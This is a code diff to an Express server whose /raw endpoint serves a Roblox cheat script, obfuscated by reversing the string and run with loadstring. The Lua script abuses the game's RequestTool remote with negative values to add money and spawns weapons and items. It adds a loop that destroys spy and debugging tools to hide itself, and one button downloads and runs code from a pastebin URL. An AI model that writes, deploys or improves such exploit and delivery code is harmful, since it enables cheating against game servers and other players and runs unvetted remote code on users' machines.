@@ -2,8 +2,27 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// السكربت الأساسي
 const myScript = `
+-- [ نظام حماية اللغة العربية ]
+local function fixArabic(text)
+    return text -- يمكن إضافة مكتبة تصحيح هنا لاحقاً إذا استمرت المربعات
+end
+
+-- [ Anti-Spy System ]
+local function DisableSpies()
+    local names = {"TurtleSpy", "SimpleSpy", "HttpSpy", "RemoteSpy", "Spy", "Explorer"}
+    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        for _, spyName in pairs(names) do
+            if v.Name:find(spyName) then
+                v:Destroy()
+            end
+        end
+    end
+end
+task.spawn(function()
+    while task.wait(2) do DisableSpies() end -- فحص مستمر كل ثانيتين
+end)
+
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 local MainFrame = Instance.new("Frame", ScreenGui)
 local TopBar = Instance.new("Frame", MainFrame)
@@ -12,10 +31,11 @@ local TabsFrame = Instance.new("Frame", MainFrame)
 local ContentFrame = Instance.new("Frame", MainFrame)
 local MinimizeBtn = Instance.new("TextButton", ScreenGui)
 
+-- [ إعدادات التصميم ]
 MainFrame.Size = UDim2.new(0, 350, 0, 300)
 MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
-MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-MainFrame.Visible = true -- جعلتها تعمل فوراً للتجربة
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.Visible = true
 MainFrame.Active = true
 MainFrame.Draggable = true
 Instance.new("UICorner", MainFrame)
@@ -29,10 +49,11 @@ MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(1, 0)
 
 TopBar.Size = UDim2.new(1, 0, 0, 35)
-TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+TopBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 Title.Size = UDim2.new(1, 0, 1, 0)
 Title.Text = "My Private Script v3"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
 
 TabsFrame.Size = UDim2.new(0, 80, 1, -45)
 TabsFrame.Position = UDim2.new(0, 5, 0, 40)
@@ -48,7 +69,7 @@ local function CreateTab(tabName)
     page.Size = UDim2.new(1, 0, 1, 0)
     page.BackgroundTransparency = 1
     page.Visible = false
-    page.ScrollBarThickness = 3
+    page.ScrollBarThickness = 2
     Instance.new("UIListLayout", page).Padding = UDim.new(0, 8)
     
     local btn = Instance.new("TextButton", TabsFrame)
@@ -65,13 +86,13 @@ local function CreateTab(tabName)
     return page
 end
 
-local TabTajmee = CreateTab("تجميع")
-local TabSpawn = CreateTab("رسبنة")
+local TabTajmee = CreateTab("Farm")
+local TabSpawn = CreateTab("Spawn")
 
 local function AddButton(parent, text, callback)
     local b = Instance.new("TextButton", parent)
     b.Size = UDim2.new(1, -10, 0, 40)
-    b.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
+    b.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
     b.Text = text
     b.TextColor3 = Color3.fromRGB(255, 255, 255)
     Instance.new("UICorner", b)
@@ -80,28 +101,26 @@ end
 
 local AmountInput = Instance.new("TextBox", TabTajmee)
 AmountInput.Size = UDim2.new(1, -10, 0, 40)
-AmountInput.PlaceholderText = "اكتب المبلغ هنا"
+AmountInput.PlaceholderText = "Amount"
 AmountInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
 AmountInput.TextColor3 = Color3.fromRGB(255, 255, 255)
 Instance.new("UICorner", AmountInput)
 
-AddButton(TabTajmee, "إضافة الفلوس فورا", function()
+AddButton(TabTajmee, "Add Money", function()
     local val = tonumber(AmountInput.Text)
     if val then
-        local negativeVal = -math.abs(val)
-        game:GetService("ReplicatedStorage").RequestTool:FireServer("Desert Deagle", negativeVal)
+        game:GetService("ReplicatedStorage").RequestTool:FireServer("Desert Deagle", -math.abs(val))
     end
 end)
 
-AddButton(TabTajmee, "تشغيل أوتو كليك", function() 
+AddButton(TabTajmee, "Auto Click", function() 
     loadstring(game:HttpGet("https://pastebin.com/raw/eR1HPXfw"))() 
 end)
 
 local items = {
-    {"رسبون M4", "M4A1"}, {"رسبون ديقل", "Desert Deagle"}, {"رسبون كلبشة", "Handcuffs"},
-    {"رسبون راديو", "Radio"}, {"رسبون طلق", "AmmoBox"}, {"رسبون كيس", "Filled Packet"},
-    {"رسبون مفتاح مركز", "مفتاح المركز"}, {"رسبون فايف", "FiveSeven"},
-    {"رسبون درع خفيف", "Light Vest"}, {"رسبون درع ثقيل", "Heavy Vest"}
+    {"M4", "M4A1"}, {"Deagle", "Desert Deagle"}, {"Handcuffs", "Handcuffs"},
+    {"Radio", "Radio"}, {"Ammo", "AmmoBox"}, {"Packet", "Filled Packet"},
+    {"FiveSeven", "FiveSeven"}, {"Heavy Vest", "Heavy Vest"}
 }
 for _, item in pairs(items) do
     AddButton(TabSpawn, item[1], function() game:GetService("ReplicatedStorage").RequestTool:FireServer(item[2], 0) end)
@@ -112,22 +131,11 @@ MinimizeBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFra
 `;
 
 app.get('/raw', (req, res) => {
-    // تشفير بسيط بالنص العكسي لضمان عمل loadstring بدون تعقيد Base64 الزائد
     const encoded = myScript.split("").reverse().join("");
-    const finalWrapper = `
-        local data = "${encoded.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"
-        local function reverse(s)
-            local res = ""
-            for i = #s, 1, -1 do res = res .. s:sub(i,i) end
-            return res
-        end
-        loadstring(reverse(data))()
-    `;
-    
+    const finalWrapper = `local d="${encoded.replace(/"/g, '\\"').replace(/\n/g, '\\n')}" local function r(s) local res="" for i=#s,1,-1 do res=res..s:sub(i,i) end return res end loadstring(r(d))()`;
     res.set('Content-Type', 'text/plain');
     res.send(finalWrapper);
 });
 
-app.get('/', (req, res) => res.send('Server Online'));
-
-app.listen(PORT, () => console.log('Port: ' + PORT));
+app.get('/', (req, res) => res.send('System Secure'));
+app.listen(PORT, () => console.log('Running'));
